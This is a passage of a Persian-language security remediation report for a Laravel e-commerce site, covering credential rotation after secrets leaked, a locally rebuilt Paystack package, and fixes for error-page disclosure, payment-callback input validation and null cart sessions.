| اعتبارنامه پنل پیامک | FarazSMS, Melipayamak, Twilio | ارسال پیامک با اعتبار شما |
| کلید ورود اجتماعی | Google، Facebook و... | جعل هویت در ورود اجتماعی |

### اقدام الزامی شما (به‌ترتیب اولویت)

1. **چرخش `APP_KEY`** — توجه: با تغییر `APP_KEY` تمام داده‌های
   رمزنگاری‌شده و نشست‌های فعال بی‌اعتبار می‌شوند. برنامه‌ریزی کنید.
2. **تغییر رمز دیتابیس** و به‌روزرسانی `.env`.
3. **بازسازی (regenerate) کلیدهای درگاه پرداخت** — مستقیم‌ترین ریسک مالی.
4. **تغییر اعتبارنامه پنل‌های پیامک.**
5. **بازسازی کلیدهای OAuth.**
6. **پاک‌سازی تاریخچه:** دستورها در `docs/deployment.md`.
7. **اگر مخزن برای مدتی عمومی بوده**، فرض کنید همه‌چیز کاملاً افشا
   شده است و به ترتیب بالا اقدام کنید.

> ⚠ پاک‌کردن تاریخچه **بدون چرخش کلیدها بی‌فایده است**: نسخه‌های
> کپی‌شده (fork، clone همکاران، کش GitHub) مقادیر قدیمی را دارند و
> آن مقادیر تا وقتی تغییر نکنند معتبرند.

## نکتهٔ باقی‌ماندهٔ این دور

- **پکیج `mehedi-iitdu/laravel-paystack`**: نسخهٔ اصلی از GitHub و Packagist
  حذف شده است (هر دو ۴۰۴). جایگزین محلی در `packages/laravel-paystack`
  با همان API ساخته شد. **هیچ تراکنش واقعی Paystack اجرا نشده است** چون
  کلید واقعی در دسترس نبود؛ جریان init/verify مطابق مستندات عمومی نوشته
  شده اما آزمون پایان‌به‌پایان پرداخت روی محیط عملیاتی لازم است.
- **دسترسی ناشناس به `/admin`**: پاسخ ۳۰۲ به صفحهٔ ورود (رفتار درست)؛
  بررسی شد که هیچ زیرمسیر مدیریتی بدون احراز هویت محتوا برنمی‌گرداند
  و مسیرهای افزونهٔ نصب‌نشده ۴۰۴ می‌دهند (نه ۲۰۰ خالی).

## پیوست دور سوم — یافته‌های امنیتی (۱۴۰۵/۰۷/۲۰)

### R-14 — افشای جزئیات داخلی در پاسخ ۵۰۰ (متوسط → رفع شد)

**محل:** همهٔ مسیرهایی که در این دور ۵۰۰ می‌دادند.

**شرح:** در حالت `APP_DEBUG=true` صفحهٔ خطا مسیر کامل فایل، شمارهٔ خط و متن استثنا را
نشان می‌دهد. در تولید با `APP_DEBUG=false` این اطلاعات نمایش داده نمی‌شود، اما هر ۵۰۰
به‌خودی‌خود یافتهٔ کیفیت است و لاگ‌ها هم مسیر مطلق فایل را ثبت می‌کنند.

**رفع:** ریشهٔ هر ۵ خطا برطرف شد (۹ آدرس). بازبینی: **صفر خطای ۵۰۰** در ۲۴۷ مسیر × ۲ نما.
**آزمون:** `tools/crawl_all_pages.sh` → ۰ خطا.

### R-15 — محافظت از حملهٔ فرهنگ‌نامه‌ای (تأیید کارکرد)

روی ورود و مسیرهای OTP محدودکنندهٔ نرخ فعال است؛ در آزمون‌ها پاسخ **۴۲۹ Too Many
Requests** مشاهده شد که نشانهٔ کارکرد درست محافظت است (مسیرهای `users/login/otp`،
`verification/phone/code/resend`، `password/phone/reset` با `throttle` علامت‌گذاری
شده‌اند). ابزارهای سنجش سلامت اکنون ۴۲۹ را تشخیص می‌دهند و به‌اشتباه «خرابی» تفسیر
نمی‌کنند. **یافته:** نیازی به تغییر نبود.

### R-16 — اعتبارسنجی ورودی در بازگشت از درگاه پرداخت (متوسط → رفع شد)

**محل:** `app/Http/Controllers/ZarinpalController.php::back_url`

**شرح:** کد پیشین مستقیماً `$_GET['Authority']` را می‌خواند؛ در نبود پارامتر هشدار PHP
+ استثنا + پاسخ ۵۰۰، و با پارامتر نامعتبر `$order` تهی می‌شد و خط بعد خطای
«Trying to get property 'id' of non-object» می‌داد.

**رفع:** خواندن از `$request->input('Authority')` (لایهٔ درخواست لاراول)، بررسی وجود و
اعتبار سفارش، و در غیر این صورت هدایت به خانه با پیام خطا.
**آزمون:** `zarinpal_back_url_without_authority_redirects` → ۳۰۲ بدون ۵۰۰.

### R-17 — ایمنی نشست سبد خرید (پایین → رفع شد)

**محل:** کنترلرها و ویوهای سبد خرید/مقایسه (۱۴ فایل، ۲۸ نقطه).

**شرح:** `Session::get('cart')` بدون بررسی null در `foreach`/`count()` مصرف می‌شد →
پاسخ ۵۰۰ در صفحه‌های عمومی، از جمله partial نوار بالا که در همهٔ صفحات رندر می‌شود
(هزینهٔ حمله برای مهاجم تقریباً صفر، بدون نیاز به ورود).

**رفع:** الگوی ایمن `(Session::get('cart') ?? [])`؛ پیش‌فرض آرایه در کنترلرها؛ رندر
ایمن partialها. توجه: الگوی نادرست `(array) Session::get(...)` خودش باگ جدید می‌ساخت
و در همین دور اصلاح شد.
**آزمون:** دو تست با سبد خالی و پُر + جریان کامل خرید دستی (۶ گام، همه ۲۰۰).
